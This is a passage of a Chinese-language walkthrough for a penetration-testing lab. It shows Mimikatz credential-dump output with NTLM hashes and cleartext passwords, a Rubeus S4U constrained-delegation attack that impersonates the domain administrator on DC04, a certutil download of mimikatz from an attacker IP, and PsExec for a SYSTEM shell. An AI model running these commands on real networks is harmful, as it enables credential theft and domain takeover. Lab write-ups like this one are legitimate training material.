         * SHA1     : b4100fd85eccbbff21f4c16b8b9394dc78cc91e6
        tspkg :
        wdigest :
         * Username : cleaner
         * Domain   : MS02
         * Password : (null)
        kerberos :
         * Username : cleaner
         * Domain   : MS02
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 28595507 (00000000:01b45533)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/9/2026 11:55:22 AM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : MS02$
         * Domain   : CLIENT
         * NTLM     : dc7a49c0c36399ae87f3de623ebab985
         * SHA1     : 7598cf051bb29bbd4cb2b794e481f42a16cb9010
        tspkg :
        wdigest :
         * Username : MS02$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : MS02$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : F``f/yTf2\g7aNM-CB/dxd ;x6bUGbW=o HFgcvU9IQ:N@D)dt;q/B@_rY8]C+;R]8n@zJSs)?Pt5\!dIq"dT$E[X36RGLzK/Pm0,<qmqM$pbe(.hYR3YfSy
        ssp :
        credman :

Authentication Id : 0 ; 72675 (00000000:00011be3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS02$
         * Domain   : CLIENT
         * NTLM     : dc7a49c0c36399ae87f3de623ebab985
         * SHA1     : 7598cf051bb29bbd4cb2b794e481f42a16cb9010
        tspkg :
        wdigest :
         * Username : MS02$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : MS02$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : F``f/yTf2\g7aNM-CB/dxd ;x6bUGbW=o HFgcvU9IQ:N@D)dt;q/B@_rY8]C+;R]8n@zJSs)?Pt5\!dIq"dT$E[X36RGLzK/Pm0,<qmqM$pbe(.hYR3YfSy
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS02$
Domain            : CLIENT
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:31 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MS02$
         * Domain   : CLIENT
         * NTLM     : dc7a49c0c36399ae87f3de623ebab985
         * SHA1     : 7598cf051bb29bbd4cb2b794e481f42a16cb9010
        tspkg :
        wdigest :
         * Username : MS02$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : ms02$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 31170230 (00000000:01db9eb6)
Session           : Interactive from 0
User Name         : pwned
Domain            : MS02
Logon Server      : MS02
Logon Time        : 3/9/2026 12:48:03 PM
SID               : S-1-5-21-86684712-58618190-611843015-1006
        msv :
         [00000003] Primary
         * Username : pwned
         * Domain   : MS02
         * NTLM     : 89551acff8895768e489bb3054af94fd
         * SHA1     : 53b82718281a81ce064fca37118f0127112844d6
        tspkg :
        wdigest :
         * Username : pwned
         * Domain   : MS02
         * Password : (null)
        kerberos :
         * Username : pwned
         * Domain   : MS02
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 28595122 (00000000:01b453b2)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/9/2026 11:55:22 AM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : MS02$
         * Domain   : CLIENT
         * NTLM     : dc7a49c0c36399ae87f3de623ebab985
         * SHA1     : 7598cf051bb29bbd4cb2b794e481f42a16cb9010
        tspkg :
        wdigest :
         * Username : MS02$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : MS02$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : F``f/yTf2\g7aNM-CB/dxd ;x6bUGbW=o HFgcvU9IQ:N@D)dt;q/B@_rY8]C+;R]8n@zJSs)?Pt5\!dIq"dT$E[X36RGLzK/Pm0,<qmqM$pbe(.hYR3YfSy
        ssp :
        credman :

Authentication Id : 0 ; 278469 (00000000:00043fc5)
Session           : Interactive from 1
User Name         : offshore_adm
Domain            : CLIENT
Logon Server      : DC04
Logon Time        : 3/8/2026 11:34:11 PM
SID               : S-1-5-21-524867371-2016665888-3240400722-1104
        msv :
         [00000003] Primary
         * Username : offshore_adm
         * Domain   : CLIENT
         * NTLM     : 41b52c3a62bdf56dc69ccb0e7c7ebe6c
         * SHA1     : 608fe5ab07ec99a492d558296f5ac05e089db667
         * DPAPI    : 969988ea37f80ecfa6f9b719f17f99aa
        tspkg :
        wdigest :
         * Username : offshore_adm
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : offshore_adm
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : CLIENT\offshore_adm
         * Domain   : CLIENT\offshore_adm
         * Password : Banker!123
         [00000001]
         * Username : cleaner
         * Domain   : cleaner
         * Password : Cleanup_Cleanup!
         [00000002]
         * Username : offshore_adm
         * Domain   : offshore_adm
         * Password : Banker!123

Authentication Id : 0 ; 94301 (00000000:0001705d)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:36 PM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
        msv :
         [00000003] Primary
         * Username : MS02$
         * Domain   : CLIENT
         * NTLM     : dc7a49c0c36399ae87f3de623ebab985
         * SHA1     : 7598cf051bb29bbd4cb2b794e481f42a16cb9010
        tspkg :
        wdigest :
         * Username : MS02$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : MS02$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : F``f/yTf2\g7aNM-CB/dxd ;x6bUGbW=o HFgcvU9IQ:N@D)dt;q/B@_rY8]C+;R]8n@zJSs)?Pt5\!dIq"dT$E[X36RGLzK/Pm0,<qmqM$pbe(.hYR3YfSy
        ssp :
        credman :

Authentication Id : 0 ; 72705 (00000000:00011c01)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS02$
         * Domain   : CLIENT
         * NTLM     : dc7a49c0c36399ae87f3de623ebab985
         * SHA1     : 7598cf051bb29bbd4cb2b794e481f42a16cb9010
        tspkg :
        wdigest :
         * Username : MS02$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : MS02$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : F``f/yTf2\g7aNM-CB/dxd ;x6bUGbW=o HFgcvU9IQ:N@D)dt;q/B@_rY8]C+;R]8n@zJSs)?Pt5\!dIq"dT$E[X36RGLzK/Pm0,<qmqM$pbe(.hYR3YfSy
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:33 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 35866 (00000000:00008c1a)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:28 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : MS02$
         * Domain   : CLIENT
         * NTLM     : dc7a49c0c36399ae87f3de623ebab985
         * SHA1     : 7598cf051bb29bbd4cb2b794e481f42a16cb9010
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS02$
Domain            : CLIENT
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:27 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MS02$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : ms02$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

mimikatz # 
```

**【关键动作】在输出的茫茫多信息中，寻找两个极其重要的东西并记录下来：**

    - 找到 Username : cleaner 的部分，记录下它的明文密码：Cleanup_Cleanup!。
    - 找到 Username : MS02$ (注意有个美元符号，这是**机器账户**) 的部分，记录下它的 **NTLM Hash**（根据 WP，应该是 dc7a49c0c36399ae87f3de623ebab985）。

---

![](/image/prolabs/Offshore-87.png)

### 利用约束性委派打下 DC04 (S4U Attack)
**原理科普**：在活动目录中，机器 MS02 被配置了 AllowedToDelegate（允许委派）给 DC04 的 cifs（文件共享）服务。这意味着，如果我们掌握了 MS02$ 机器账户的 Hash，我们就能“假传圣旨”，伪造任何用户（比如 Domain Admin administrator）的身份去访问 DC04。

+ **上传 Rubeus 工具**  
把 Rubeus.exe（专搞 Kerberos 票据的神器）传到 MS02 上（放到 C:\Users\Public\）。

**发起 S4U 攻击（申请伪造票据）**  
在**高权限**的 CMD 中（或者重新开一个 powershell），执行以下命令：  
_(注意替换其中的 Hash 为你刚才抓到的__ __MS02$__ __的 Hash)_

+ **Cmd **

```plain
C:\Users\Public\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:"cifs/DC04.CLIENT.OFFSHORE.COM" /altservice:cifs /ptt
```

**参数解析：****  ****参数分析：**

    - /rc4：我们使用机器账户的 NTLM hash 来认证。
    - /impersonateuser:administrator：我们要伪装成域管 administrator。  
/impersonateuser：administrator：我们要伪装成域管 administrator。
    - /msdsspn：我们要访问的目标服务（DC04的cifs）。
    - /ptt：Pass-The-Ticket，把伪造好的票据直接注入到当前的内存会话中。

```c
C:\Windows\system32>C:\Users\Public\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:"cifs/DC04.CLIENT.OFFSHORE.COM" /altservice:cifs /ptt
C:\Users\Public\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:"cifs/DC04.CLIENT.OFFSHORE.COM" /altservice:cifs /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 

[*] Action: S4U

[*] Using rc4_hmac hash: dc7a49c0c36399ae87f3de623ebab985
[*] Building AS-REQ (w/ preauth) for: 'CLIENT.OFFSHORE.COM\MS02$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Using domain controller: DC04.CLIENT.OFFSHORE.COM (172.16.4.5)
[*] Building S4U2self request for: 'MS02$@CLIENT.OFFSHORE.COM'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'MS02$@CLIENT.OFFSHORE.COM'
[*] base64(ticket.kirbi):

      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
      BU1TMDIk

[*] Impersonating user 'administrator' to target SPN 'cifs/DC04.CLIENT.OFFSHORE.COM'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Using domain controller: DC04.CLIENT.OFFSHORE.COM (172.16.4.5)
[*] Building S4U2proxy request for service: 'cifs/DC04.CLIENT.OFFSHORE.COM'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/DC04.CLIENT.OFFSHORE.COM':

      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
[+] Ticket successfully imported!
```

**验证并获取 DC04 的 Flag**  
在这个**已经注入了票据**的 CMD 窗口中，直接访问 DC04 的 C 盘隐藏共享：

+ **Cmd **

```plain
dir \\DC04.CLIENT.OFFSHORE.COM\c$
```

能列出目录，说明拿下了！

```c
C:\Windows\system32>dir \\DC04.CLIENT.OFFSHORE.COM\c$
dir \\DC04.CLIENT.OFFSHORE.COM\c$
 Volume in drive \\DC04.CLIENT.OFFSHORE.COM\c$ has no label.
 Volume Serial Number is AEB9-4ACD

 Directory of \\DC04.CLIENT.OFFSHORE.COM\c$

09/18/2020  06:17 PM    <DIR>          e98e25926bd14f4b84a7
02/03/2020  01:19 PM    <DIR>          PerfLogs
01/29/2025  09:42 AM    <DIR>          Program Files
02/06/2020  04:47 PM    <DIR>          Program Files (x86)
07/17/2018  05:11 PM    <DIR>          Users
04/01/2025  12:07 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  15,851,720,704 bytes free
```

## Mimikatz上传
```c
C:\Windows\system32>pushd \\DC04.CLIENT.OFFSHORE.COM\c$\users\
pushd \\DC04.CLIENT.OFFSHORE.COM\c$\users\

Z:\Users>cd Public\Desktop
cd Public\Desktop

Z:\Users\Public\Desktop>certutil -urlcache -f http://10.10.16.2/mimikatz.exe mimikatz.exe
certutil -urlcache -f http://10.10.16.2/mimikatz.exe mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

Z:\Users\Public\Desktop>mimikatz
mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 
```

`pushd` 会自动：

1. 映射一个临时盘符（比如 `Z:`）
2. 进入该目录
3. 输入 popd  即可恢复

## Getlag
```c
C:\Windows\system32>type \\DC04.CLIENT.OFFSHORE.COM\c$\users\administrator\desktop\flag.txt
type \\DC04.CLIENT.OFFSHORE.COM\c$\users\administrator\desktop\flag.txt
OFFSHORE{c@r3ful_who_y0u_d3legate_t0}
```

**获取 DC04 交互式 Shell (选做)**  
如果你想要一个 DC04 的完整 Shell，将 Sysinternals 的 PsExec64.exe 上传到 MS02，然后执行：

+ **Cmd**

```plain
C:\Users\Public\PsExec64.exe -accepteula \\DC04.CLIENT.OFFSHORE.COM cmd.exe
```

弹出的新窗口就是 DC04 的 NT AUTHORITY\SYSTEM 权限 Shell 了！

## Kali利用
### 导出票据
```c
C:\Users\Public\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:"cifs/DC04.CLIENT.OFFSHORE.COM" /altservice:cifs /outfile:client_dc04.kirbi

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 

[*] Action: S4U

[*] Using rc4_hmac hash: dc7a49c0c36399ae87f3de623ebab985
[*] Building AS-REQ (w/ preauth) for: 'CLIENT.OFFSHORE.COM\MS02$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFljCCBZKgAwIBBaEDAgEWooIEmTCCBJVhggSRMIIEjaADAgEFoRUbE0NMSUVOVC5PRkZTSE9SRS5D
      T02iKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0NMSUVOVC5PRkZTSE9SRS5DT02jggRDMIIEP6ADAgESoQMC
      AQKiggQxBIIELR6fNxBY3Wup0cZ6feYmJ73YI69mJZj04K/Slkg3f2TStbWCPWDrkQHzPva+Y2LQgmFR
      0c+GFc+3exc4LlVA9NjrUreDPEM3jNeOahVU3OT+ML+F3APZEGw2meT3yQxnyd1+iBrGEowc7paMgr4m
      Wm09MoIZmdtCHyXciCAS17RGZnaGq5ZXQivBmC3bWEXVFTUbf9BPbv+rIXAC8bs6xM4/yqx9M4Y+9WJn
      2WUsnGHDD7OcH9D2poFd3iDQoX/Jhyv4m5pRqfdK9WdPJR4YR4t9UV9zvDDFjfbhX6J8pnqPPQ5vAp9f
      3GL3UgekQZdrPFGkfyOjuXh6E7lpNdrT44T9COMw1uCVPYlF7at0kT/AOO/YUSwUuXr/Y52dsNhIKsTD
      y7JgrqsOKLe2PCqDBcr0Iwlz7B+1DPdfeuVzIKmSEGp32CE8n3r6juBIMTvQDVnk6i749Mned6NIjw5J
      rfPQAVQ5WwQUdpBcI2D6VaMDdm3hWTMS73kmjDqrb5beinhCipGufp4feLqHu9Aann28EcAsRGFYrLYl
      8ZK41ZRbViDvQnv785KbHkm7AfVM/YUV5HFTopyZ09XvAC5Myo5tSVVh2MnWzp0BDmj5GUoGYeKzxNCL
      ezneKlsXJeVZVGUXDi3YezI5FvtRpPfQJw7v6tQcFqkxl9JRc9SWYMGV5LQMdkEThTJdV7dT2tBrDSW+
      okOzE/OwxsBddCxpAp/D/5OqP68U9exqg0QolkNWj0ru/TgwF6tGSIrC5EICheHgX9opC4TX3mN02V47
      SDoRqPXr4qjva8fYGaKMlzFsKXuD75jNOrSmNcOjB7javgbuEVquJCWC+oBQK1OXyl1sD0f+JxPazFrR
      qnd5QtX03K3g+gg5qlUkNiVJcvkL5AQGD9rufDOMfp6pr/kU59Y8a2353MNqlmJ13WG5ec4oUNUzXwrR
